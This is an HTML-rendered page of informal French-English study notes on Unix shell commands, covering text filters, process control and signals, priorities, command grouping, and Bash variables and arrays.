&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot; &quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;:&quot;&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;expand&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# tabulation to spaces&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;unexpand&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# spaces to tab&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# manage output&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# read output delimited by space or line break&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# and execute command on them&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;input | xargs
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;input | xargs &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 2
&lt;span class=&quot;c&quot;&gt;# 2 columns&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# other&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sort&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;uniq&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;join&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;paste&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;tac&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;hexdump
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;od&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;banner
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; ou &lt;span class=&quot;nb&quot;&gt;nl&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;tail&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;column &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt;: &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; /etc/passwd

&lt;span class=&quot;c&quot;&gt;# duplication du canal&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;tee&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/passwd | &lt;span class=&quot;nb&quot;&gt;cut&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;: &lt;span class=&quot;nt&quot;&gt;-f1&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tee &lt;/span&gt;users.txt | &lt;span class=&quot;nb&quot;&gt;wc&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -a: append, n'écrase pas contenu fichier&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;diff
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;comp

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;10

&lt;span class=&quot;c&quot;&gt;# controler flux&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;pv &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; test2
&lt;span class=&quot;c&quot;&gt;# durée compression&lt;/span&gt;
pv /blabla/fic | &lt;span class=&quot;nb&quot;&gt;gzip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; test.gz
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h1 id=&quot;ii---process&quot;&gt;II - Process&lt;/h1&gt;
&lt;hr /&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;PID&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;PPID&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;UID&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;GID&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;priority&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;working directory&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;opened files (descripteurs)
processus fils du shell pour lancer commandes
ls -R / &amp;gt; ls.txt 2&amp;gt;/dev/null &amp;amp;
le process en fond ne doit pas attendre de saisie
pas d’affichage
ne pas quitter shell avec traitement&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;jobs
&lt;/span&gt;numJob PID
ctrl + z: mettre en pause

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;fg&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# to foreground&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;bg&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# to background&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;### list process&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ps &lt;span class=&quot;c&quot;&gt;# process launch by user from current shell&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ps &lt;span class=&quot;nt&quot;&gt;-ef&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# all process&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -f: more info&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -e: all process&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -u mourad&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -g wheel&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -t tty0: terminal&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -p 123445&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# l: more more info&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;signals&quot;&gt;signals&lt;/h3&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# show all available signals&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;kill&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# 1(SIGHUP): send by parent process before die&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# 2(SIGINT): interruption (ctrl + c)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# 3(SIGQUIT): interruption + core dump&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# 9(SIGKILL): force fin brutale&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# 15(SIGTERM): by default, fin gentille&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;kill &lt;/span&gt;1234 &lt;span class=&quot;c&quot;&gt;# kill process by PID&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;kill&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 9 1234 &lt;span class=&quot;c&quot;&gt;# with signal&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;pkill firefox &lt;span class=&quot;c&quot;&gt;# kill process with its name&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;pgrep &lt;span class=&quot;nb&quot;&gt;sleep&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# get PID with process name&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;nohup ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-lR&lt;/span&gt; / &amp;amp; &lt;span class=&quot;c&quot;&gt;# ne plus tenir compte du SIGHUP lorsque le pére meurt&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;priority&quot;&gt;priority&lt;/h3&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# launch command with priority&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;nice&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-10&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-lR&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;list 2&amp;gt;/dev/null &amp;amp;

&lt;span class=&quot;c&quot;&gt;# change priority of process&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;renice &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 10 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; 1234

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;time ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-lR&lt;/span&gt; /home
&lt;span class=&quot;c&quot;&gt;# real: durée total exec commande&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# user: CPU time&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# system: durée du temps CPU necessaire pour éxecuter commande&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;ksh &lt;span class=&quot;c&quot;&gt;# replace current process by another&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;groupement&quot;&gt;groupement&lt;/h3&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;uname&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;pwd&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; res.txt &amp;amp; &lt;span class=&quot;c&quot;&gt;# multipls shells&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;uname&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;pwd&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; res.txt &amp;amp; &lt;span class=&quot;c&quot;&gt;# one shell&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# return code of last command&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# echo $?&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# 0 : success&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# else : error&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;cmd &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; cmd &lt;span class=&quot;c&quot;&gt;# and&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;cmd &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; cmd &lt;span class=&quot;c&quot;&gt;# or&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# launch in child&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# launch in current shell&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h3 id=&quot;les-variables&quot;&gt;les variables&lt;/h3&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# user (minuscules)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# system (majuscules)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# speciale&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# variable&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ nom&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Mourad
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$nom&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;env&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# show user and system variables&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;...&quot;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# read variables&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'...'&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# don't read variables&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;unset &lt;/span&gt;nom &lt;span class=&quot;c&quot;&gt;# delete var&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;readonly &lt;/span&gt;nom &lt;span class=&quot;c&quot;&gt;# protect var (read only and can't delete)&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;nom &lt;span class=&quot;c&quot;&gt;# share var with shell children, but modification is limited&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;fic&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;1 &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;fic&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;2 &lt;span class=&quot;c&quot;&gt;# accolades&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;### replacement&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;x:-texte&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# if x empty, else texte&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;x:&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;texte&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# if x empty, x=texte&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;x:-texte&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# if x not empty, x=texte &lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;x:?texte&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# if x empty, script stopped and display texte&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;system-variables&quot;&gt;system variables&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;variable&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;content&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;$HOME&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;$PATH&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;$PS1&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;$PS2&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;$PS3&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;$IFS&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;caractère standard de séparation des commandes&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;$MAIL&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;chemin des mails&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;$SHELL&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;$LANG&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;$USER&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;$LOGNAME&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;$HISTFILE&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;nom fichier history&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;$HISTSIZE&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;taille histiry&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;$OLDPWD&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;$PWD&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;$RANDOM&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;(0 à 32767)&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&quot;speciale-variables&quot;&gt;speciale variables&lt;/h3&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# readonly, contexctual content&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$?&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# return code of last command&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$$&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# PID of current shell&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$!&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# PID of last shell launch with &amp;amp;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$-&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# shell options&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;strings&quot;&gt;strings&lt;/h3&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Jules
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Longueur de &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$a&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;: &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${#&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# array&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nom[0]&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;test&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nom[1]&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;a&quot;&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;nom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[1]&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# or&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ nom&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=(&lt;/span&gt;text,a&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;nom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[*]&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${#&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;nom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[*]&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# si index est variable, pas de $&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0

